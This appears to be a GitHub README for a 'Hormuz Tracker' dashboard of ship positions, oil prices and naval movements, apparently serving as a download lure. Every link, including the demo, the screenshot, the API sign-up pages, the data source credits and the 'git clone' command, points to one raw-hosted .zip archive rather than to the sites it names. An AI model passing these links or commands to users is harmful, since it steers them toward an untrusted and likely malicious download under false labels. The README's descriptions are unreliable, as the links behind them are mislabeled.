# Hormuz Tracker — Real-Time Strait of Hormuz Intelligence Dashboard

Live vessel tracking, oil price monitoring, dark ship detection, and naval force positions for the world's most critical maritime chokepoint.

**[Live Demo](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip)** | **[Full Analysis on The Board](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip)**

![Hormuz Tracker Dashboard](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip)

## What It Tracks

- **88+ vessels** in real-time via AIS (Automatic Identification System)
- **Dark ships** — vessels with disabled transponders, estimated positions in the shipping lane
- **Oil prices** — Brent & WTI with historical charts (EIA + FRED data)
- **Transit history** — daily vessel counts through the strait (IMF PortWatch)
- **US Navy carrier positions** — 10 carriers tracked via GDELT/USNI intelligence
- **7-day maritime weather** — wind warnings, gust forecasts (Open-Meteo)
- **Breaking news** — Google News RSS for Hormuz-related headlines
- **Crisis analytics** — economic impact estimates, bypass route capacity, escalation index

## Why Hormuz Matters

21 million barrels of oil pass through the Strait of Hormuz daily — roughly 21% of global consumption. A blockade would trigger the largest energy crisis in history.

For in-depth geopolitical analysis: **[The Board — Geopolitical Intelligence](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip)**

## Tech Stack

- **Frontend**: Next.js 16 + React 19 + Tailwind CSS 4
- **Map**: Mapbox GL JS with custom GeoJSON layers
- **Charts**: Recharts
- **Data Sources**: AISStream, IMF PortWatch, EIA, FRED, Open-Meteo, GDELT, Google News RSS

## Getting Started

```bash
git clone https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip
cd hormuz-tracker
npm install
cp .env.example .env.local
# Add your API keys to .env.local
npm run dev
```

Open [http://localhost:3000](http://localhost:3000).

## API Keys (all free)

| Service | Get Key | What It Provides |
|---------|---------|-----------------|
| [Mapbox](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Free tier (50K loads/mo) | Map rendering |
| [EIA](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Free | Oil spot prices |
| [FRED](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Free | Historical oil data |

Weather, transit history, news, and carrier data require no API keys.

## Data Sources & Attribution

| Data | Source | Update Frequency |
|------|--------|-----------------|
| Vessel positions | [AISStream](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Real-time (5s) |
| Transit counts | [IMF PortWatch](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Daily |
| Oil prices | [EIA](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) + [FRED](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Daily |
| Carrier positions | [USNI News](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) + [GDELT](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Hourly |
| Weather | [Open-Meteo](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Hourly |
| News | [Google News RSS](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | 5 minutes |

## Related

- [The Board — AI-Powered Geopolitical Intelligence](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) — 766K+ articles, 6K+ sources, AI-generated long-form analysis
- [Strait of Hormuz Blockade Analysis](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) — Full deep-dive on oil, food, and shipping impacts
- [Iran Nuclear Timeline](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) — Enrichment breakout analysis

## License

MIT
